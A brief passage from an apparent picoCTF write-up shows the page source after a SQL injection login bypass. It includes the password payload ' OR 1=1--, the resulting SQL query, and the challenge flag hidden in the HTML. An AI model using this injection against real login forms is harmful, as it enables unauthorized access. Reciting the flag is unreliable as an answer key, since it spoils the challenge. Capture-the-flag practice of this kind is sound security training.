Now, By observing the source code we get the flag ```picoCTF{L00k5_l1k3_y0u_solv3d_it_33d32a56}```:
```html
<pre>username: admin
password: &#039; OR 1=1--
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039; OR 1=1--&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_33d32a56}</p>
